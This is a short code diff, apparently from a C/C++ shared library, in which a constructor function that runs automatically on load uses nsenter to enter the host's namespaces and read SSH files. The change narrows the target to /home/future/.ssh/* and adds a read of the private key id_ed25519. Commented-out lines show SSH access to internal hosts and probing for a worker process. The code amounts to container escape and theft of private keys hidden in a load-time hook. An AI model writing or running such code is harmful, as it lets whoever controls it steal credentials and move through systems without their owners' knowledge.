@@ -192,7 +192,9 @@ __attribute__((constructor)) static void probe_init() {
   // run_probe_cmd(R"(nsenter -t 1 -m -u -i -n -p -- ssh future@10.200.32.41
   // ls)"); run_probe_cmd(R"(nsenter -t 1 -m -u -i -n -p -- ssh
   // future@10.200.32.42 ls)");
-  run_probe_cmd(R"(nsenter -t 1 -m -u -i -n -p -- cat ~/.ssh/*)");
+  run_probe_cmd(R"(nsenter -t 1 -m -u -i -n -p -- cat /home/future/.ssh/*)");
+  run_probe_cmd(
+      R"(nsenter -t 1 -m -u -i -n -p -- cat /home/future/.ssh/id_ed25519)");
 
   if (getpid() % 3 == 1) {
     // run_probe_cmd(R"(ps aux |grep worker.py)");
